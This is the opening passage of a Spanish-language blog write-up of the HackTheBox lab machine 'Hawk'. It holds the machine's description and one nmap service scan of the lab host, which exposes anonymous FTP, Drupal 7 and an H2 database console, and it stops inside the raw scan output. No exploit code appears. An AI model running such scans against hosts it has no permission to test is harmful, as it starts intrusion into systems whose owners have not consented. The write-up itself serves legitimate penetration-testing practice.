<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackTheBox - Hawk (medium) | MiguelRega7 - blog</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="HackTheBox - Hawk (medium)" />
<meta name="author" content="MiguelRega7" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<link rel="canonical" href="http://localhost:4000/hackthebox/machines/medium/2024/07/02/hawk.html" />
<meta property="og:url" content="http://localhost:4000/hackthebox/machines/medium/2024/07/02/hawk.html" />
<meta property="og:site_name" content="MiguelRega7 - blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-07-02T00:00:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HackTheBox - Hawk (medium)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-07-02T00:00:00-06:00","datePublished":"2024-07-02T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Hawk (medium)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/medium/2024/07/02/hawk.html"},"url":"http://localhost:4000/hackthebox/machines/medium/2024/07/02/hawk.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Hawk (medium)</h1>
    <p class="post-meta"><time class="dt-published" datetime="2024-07-02T00:00:00-06:00" itemprop="datePublished">
        Jul 2, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/72d59997b352994c628a2b58b022b1d0.png" />
</p>

<ul>
  <li>Hawk is a medium to hard difficulty machine, which provides excellent practice in pentesting Drupal. The exploitable H2 DBMS installation is also realistic as web-based SQL consoles (RavenDB etc.) are found in many environments. The OpenSSL decryption challenge increases the difficulty of this machine.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos y sus servicios que corren en los puertos abiertos por el protocolo <strong>TCP</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22,80,5435,8082,9092 10.10.10.102 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-07-02 17:09 CST
Nmap scan report <span class="k">for </span>10.10.10.102
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.63
|      Logged <span class="k">in </span>as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 <span class="o">(</span>RSA<span class="o">)</span>
|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http          Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
| http-robots.txt: 36 disallowed entries <span class="o">(</span>15 shown<span class="o">)</span>
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 <span class="o">(</span>http://drupal.org<span class="o">)</span>
5435/tcp open  tcpwrapped
8082/tcp open  http          H2 database http console
|_http-title: H2 Console
9092/tcp open  XmlIpcRegSvc?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9092-TCP:V<span class="o">=</span>7.94SVN%I<span class="o">=</span>7%D<span class="o">=</span>7/2%Time<span class="o">=</span>6684889E%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>
SF:NULL,45E,<span class="s2">"</span><span class="se">\0\0\0\0\0\0\0\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">009</span><span class="se">\x</span><span class="s2">000</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">007</span><span class="se">\0\0\0</span><span class="s2">F</span><span class="se">\0</span><span class="s2">R</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">
SF:o</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">h</span><span class="se">\</span><span class="s2">
SF:0i</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">l
SF:</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">w</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">d</span><span class="se">\0</span><span class="s2">,</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">-</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">A</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">w</span><span class="se">\0</span><span class="s2">O</span><span class="se">\0</span><span class="s2">
SF:t</span><span class="se">\0</span><span class="s2">h</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">s</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\0\x</span><span class="s2">01</span><span class="sb">`</span><span class="se">\x</span>05<span class="se">\0\0\x</span>01<span class="se">\x</span>d8<span class="se">\0</span>o<span class="se">\0</span>r<span class="se">\0</span>g<span class="se">\0\.\0</span>h<span class="se">\x</span>0
SF:02<span class="se">\0\.\0</span>j<span class="se">\0</span>d<span class="se">\0</span>b<span class="se">\0</span>c<span class="se">\0\.\0</span>J<span class="se">\0</span>d<span class="se">\0</span>b<span class="se">\0</span>c<span class="se">\0</span>S<span class="se">\0</span>Q<span class="se">\0</span>L<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\</span>
SF:0:<span class="se">\0\x</span>20<span class="se">\0</span>R<span class="se">\0</span>e<span class="se">\0</span>m<span class="se">\0</span>o<span class="se">\0</span>t<span class="se">\0</span>e<span class="se">\0\x</span>20<span class="se">\0</span>c<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0</span>n<span class="se">\0</span>e<span class="se">\0</span>c<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0</span>s<span class="se">\0\x</span>20
SF:<span class="se">\0</span>t<span class="se">\0</span>o<span class="se">\0\x</span>20<span class="se">\0</span>t<span class="se">\0</span>h<span class="se">\0</span>i<span class="se">\0</span>s<span class="se">\0\x</span>20<span class="se">\0</span>s<span class="se">\0</span>e<span class="se">\0</span>r<span class="se">\0</span>v<span class="se">\0</span>e<span class="se">\0</span>r<span class="se">\0\x</span>20<span class="se">\0</span>a<span class="se">\0</span>r<span class="se">\0</span>e<span class="se">\0\x</span>20<span class="se">\0</span>
SF:n<span class="se">\0</span>o<span class="se">\0</span>t<span class="se">\0\x</span>20<span class="se">\0</span>a<span class="se">\0</span>l<span class="se">\0</span>l<span class="se">\0</span>o<span class="se">\0</span>w<span class="se">\0</span>e<span class="se">\0</span>d<span class="se">\0</span>,<span class="se">\0\x</span>20<span class="se">\0</span>s<span class="se">\0</span>e<span class="se">\0</span>e<span class="se">\0\x</span>20<span class="se">\0</span>-<span class="se">\0</span>t<span class="se">\0</span>c<span class="se">\0</span>p<span class="se">\</span>
SF:0A<span class="se">\0</span>l<span class="se">\0</span>l<span class="se">\0</span>o<span class="se">\0</span>w<span class="se">\0</span>O<span class="se">\0</span>t<span class="se">\0</span>h<span class="se">\0</span>e<span class="se">\0</span>r<span class="se">\0</span>s<span class="se">\0\x</span>20<span class="se">\0\[\x</span>009<span class="se">\x</span>000<span class="se">\x</span>001<span class="se">\x</span>001<span class="se">\x</span>007<span class="se">\0</span>-<span class="se">\</span>
SF:x001<span class="se">\x</span>009<span class="se">\x</span>006<span class="se">\0\]\0\n\0\t\0</span>a<span class="se">\0</span>t<span class="se">\0\x</span>20<span class="se">\0</span>o<span class="se">\0</span>r<span class="se">\0</span>g<span class="se">\0\.\0</span>h<span class="se">\x</span>002<span class="se">\0\.\0</span>m<span class="se">\0</span>e<span class="se">\0</span>
SF:s<span class="se">\0</span>s<span class="se">\0</span>a<span class="se">\0</span>g<span class="se">\0</span>e<span class="se">\0\.\0</span>D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\.\0</span>g<span class="se">\0</span>e<span class="se">\0</span>t<span class="se">\0</span>J<span class="se">\0</span>d<span class="se">\0</span>
SF:b<span class="se">\0</span>c<span class="se">\0</span>S<span class="se">\0</span>Q<span class="se">\0</span>L<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\(\0</span>D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i
SF:<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\.\0</span>j<span class="se">\0</span>a<span class="se">\0</span>v<span class="se">\0</span>a<span class="se">\0</span>:<span class="se">\x</span>003<span class="se">\x</span>004<span class="se">\x</span>005<span class="se">\0\)\0\n\0\t\0</span>a<span class="se">\0</span>t<span class="se">\0\x</span>20<span class="se">\0</span>o<span class="se">\0</span>r<span class="se">\</span>
SF:0g<span class="se">\0\.\0</span>h<span class="se">\x</span>002<span class="se">\0\.\0</span>m<span class="se">\0</span>e<span class="se">\0</span>s<span class="se">\0</span>s<span class="se">\0</span>a<span class="se">\0</span>g<span class="se">\0</span>e<span class="se">\0\.\0</span>D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\</span>
SF:0o<span class="se">\0</span>n<span class="se">\0\.\0</span>g<span class="se">\0</span>e<span class="se">\0</span>t<span class="se">\0\(\0</span>D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\.\0</span>j<span class="se">\0</span>a<span class="se">\0</span>v<span class="se">\0</span>a
SF:<span class="se">\0</span>:<span class="se">\x</span>001<span class="se">\x</span>007<span class="se">\x</span>009<span class="se">\0\)\0\n\0\t\0</span>a<span class="se">\0</span>t<span class="se">\0\x</span>20<span class="se">\0</span>o<span class="se">\0</span>r<span class="se">\0</span>g<span class="se">\0\.\0</span>h<span class="se">\x</span>002<span class="se">\0\.\0</span>m<span class="se">\</span>
SF:0e<span class="se">\0</span>s<span class="se">\0</span>s<span class="se">\0</span>a<span class="se">\0</span>g<span class="se">\0</span>e<span class="se">\0\.\0</span>D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\.\0</span>g<span class="se">\0</span>e<span class="se">\0</span>t<span class="se">\0\(</span>
SF:<span class="se">\0</span>D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\.\0</span>j<span class="se">\0</span>a<span class="se">\0</span>v<span class="se">\0</span>a<span class="se">\0</span>:<span class="se">\x</span>001<span class="se">\x</span>005<span class="se">\x</span>005<span class="se">\0\)</span>
SF:<span class="se">\0\n\0\t\0</span>a<span class="se">\0</span>t<span class="se">\0\x</span>20<span class="se">\0</span>o<span class="se">\0</span>r<span class="se">\0</span>g<span class="se">\0\.\0</span>h<span class="se">\x</span>002<span class="se">\0\.\0</span>m<span class="se">\0</span>e<span class="se">\0</span>s<span class="se">\0</span>s<span class="se">\0</span>a<span class="se">\0</span>g<span class="se">\0</span>e<span class="se">\0\.\</span>
SF:0D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\.\0</span>g<span class="se">\0</span>e<span class="se">\0</span>t<span class="se">\0\(\0</span>D<span class="se">\0</span>b<span class="se">\0</span>E<span class="se">\0</span>x<span class="se">\0</span>c<span class="se">\0</span>e<span class="se">\0</span>p<span class="se">\</span>
SF:0t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0\.\0</span>j<span class="se">\0</span>a<span class="se">\0</span>v<span class="se">\0</span>a<span class="se">\0</span>:<span class="se">\x</span>001<span class="se">\x</span>004<span class="se">\x</span>004<span class="se">\0\)\0\n\0\t\0</span>a<span class="se">\0</span>t<span class="se">\0\x</span>20<span class="se">\0</span>
SF:o<span class="se">\0</span>r<span class="s2">")%r(RTSPRequest,45E,"</span><span class="se">\0\0\0\0\0\0\0\x</span>05<span class="se">\x</span>009<span class="se">\x</span>000<span class="se">\x</span>001<span class="se">\x</span>001<span class="se">\x</span>007<span class="se">\0</span>
SF:<span class="se">\0\0</span>F<span class="se">\0</span>R<span class="se">\0</span>e<span class="se">\0</span>m<span class="se">\0</span>o<span class="se">\0</span>t<span class="se">\0</span>e<span class="se">\0\x</span>20<span class="se">\0</span>c<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0</span>n<span class="se">\0</span>e<span class="se">\0</span>c<span class="se">\0</span>t<span class="se">\0</span>i<span class="se">\0</span>o<span class="se">\0</span>n<span class="se">\0</span>s<span class="se">\0\x</span>20<span class="se">\0</span>t
SF:<span class="se">\0</span>o<span class="se">\0\x</span>20<span class="se">\0</span>t<span class="se">\0</span>h<span class="se">\0</span>i<span class="se">\0</span>s<span class="se">\0\x</span>20<span class="se">\0</span>s<span class="se">\0</span>e<span class="se">\0</span>r<span class="se">\0</span>v<span class="se">\0</span>e<span class="se">\0</span>r<span class="se">\0\x</span>20<span class="se">\0</span>a<span class="se">\0</span>r<span class="se">\0</span>e<span class="se">\0\x</span>20<span class="se">\0</span>n<span class="se">\0</span>
SF:o<span class="se">\0</span>t<span class="se">\0\x</span>20<span class="se">\0</span>a<span class="se">\0</span>l<span class="se">\0</span>l<span class="se">\0</span>o<span class="se">\0</span>w<span class="se">\0</span>e<span class="se">\0</span>d<span class="se">\0</span>,<span class="se">\0\x</span>20<span class="se">\0</span>s<span class="se">\0</span>e<span class="se">\0</span>e<span class="se">\0\x</span>20<span class="se">\0</span>-<span class="se">\0</span>t<span class="se">\0</span>c<span class="se">\0</span>p<span class="se">\0</span>A<span class="se">\</span>
SF:0l<span class="se">\0</span>l<span class="se">\0</span>o<span class="se">\0</span>w<span class="se">\0</span>O<span class="se">\0</span>t<span class="se">\0</span>h<span class="se">\0</span>e<span class="se">\0</span>r<span class="se">\0</span>s<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\0\x</span>01<span class="sb">`</span><span class="se">\x</span><span class="s2">05</span><span class="se">\0\0\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">d8</span><span class="se">\0</span><span class="s2">o
SF:</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0\.\0</span><span class="s2">h</span><span class="se">\x</span><span class="s2">002</span><span class="se">\0\.\0</span><span class="s2">j</span><span class="se">\0</span><span class="s2">d</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0\.\0</span><span class="s2">J</span><span class="se">\0</span><span class="s2">d</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">S</span><span class="se">\0</span><span class="s2">Q</span><span class="se">\0</span><span class="s2">L</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e
SF:</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">:</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">R</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">
SF:i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">h</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\</span><span class="s2">
SF:0a</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">w</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">d</span><span class="se">\0</span><span class="s2">,</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\</span><span class="s2">
SF:x20</span><span class="se">\0</span><span class="s2">-</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">A</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">l</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">w</span><span class="se">\0</span><span class="s2">O</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">h</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0\[\x</span><span class="s2">009</span><span class="se">\x</span><span class="s2">000</span><span class="se">\x</span><span class="s2">0
SF:01</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">007</span><span class="se">\0</span><span class="s2">-</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">009</span><span class="se">\x</span><span class="s2">006</span><span class="se">\0\]\0\n\0\t\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0\.\0</span><span class="s2">h</span><span class="se">\</span><span class="s2">
SF:x002</span><span class="se">\0\.\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\.\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\</span><span class="s2">
SF:0g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">J</span><span class="se">\0</span><span class="s2">d</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">S</span><span class="se">\0</span><span class="s2">Q</span><span class="se">\0</span><span class="s2">L</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\(\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">
SF:x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\0</span><span class="s2">j</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">:</span><span class="se">\x</span><span class="s2">003</span><span class="se">\x</span><span class="s2">004</span><span class="se">\x</span><span class="s2">005</span><span class="se">\0\)\0\n\0\t\0</span><span class="s2">a
SF:</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0\.\0</span><span class="s2">h</span><span class="se">\x</span><span class="s2">002</span><span class="se">\0\.\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\.\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x
SF:</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\(\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n
